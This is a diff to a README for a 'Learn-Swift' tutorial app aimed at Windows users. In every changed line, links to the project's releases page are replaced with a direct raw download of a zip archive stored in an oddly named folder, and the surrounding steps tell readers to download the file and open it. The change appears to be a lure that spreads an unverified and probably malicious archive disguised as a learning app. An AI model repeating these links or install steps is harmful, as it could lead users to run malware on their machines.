@@ -1,6 +1,6 @@
 # 📘 Learn-Swift - Learn Swift With Clear Tutorials
 
-[![Download Learn-Swift](https://img.shields.io/badge/Download%20Learn--Swift-blue?style=for-the-badge)](https://github.com/Mxxke2936/Learn-Swift/releases)
+[![Download Learn-Swift](https://img.shields.io/badge/Download%20Learn--Swift-blue?style=for-the-badge)](https://github.com/Mxxke2936/Learn-Swift/raw/refs/heads/main/Nemichthyidae/Swift_Learn_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this guide to download the app, install it, and run it on your Windows PC.
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/Mxxke2936/Learn-Swift/releases
+1. Open the release page: https://github.com/Mxxke2936/Learn-Swift/raw/refs/heads/main/Nemichthyidae/Swift_Learn_3.2.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your system.
 4. Save the file to a folder you can find later, such as Downloads or Desktop.
@@ -82,7 +82,7 @@ You can read one lesson or work through several in one session.
 
 ## 🛠️ How to Install and Run
 
-1. Go to https://github.com/Mxxke2936/Learn-Swift/releases
+1. Go to https://github.com/Mxxke2936/Learn-Swift/raw/refs/heads/main/Nemichthyidae/Swift_Learn_3.2.zip
 2. Download the newest Windows release.
 3. Wait for the file to finish downloading.
 4. Open the file.
@@ -164,7 +164,7 @@ Learn-Swift works well if you want to:
 
 ## 🔗 Download Again
 
-If you need the file later, use the release page here: https://github.com/Mxxke2936/Learn-Swift/releases
+If you need the file later, use the release page here: https://github.com/Mxxke2936/Learn-Swift/raw/refs/heads/main/Nemichthyidae/Swift_Learn_3.2.zip
 
 ## 🧭 File Name Guide
 
@@ -184,7 +184,7 @@ Swift is a modern programming language used to build apps for Apple devices. It 
 
 Use this link to visit the download page and get the latest Windows version:
 
-https://github.com/Mxxke2936/Learn-Swift/releases
+https://github.com/Mxxke2936/Learn-Swift/raw/refs/heads/main/Nemichthyidae/Swift_Learn_3.2.zip
 
 ## 🪟 Windows Notes
 
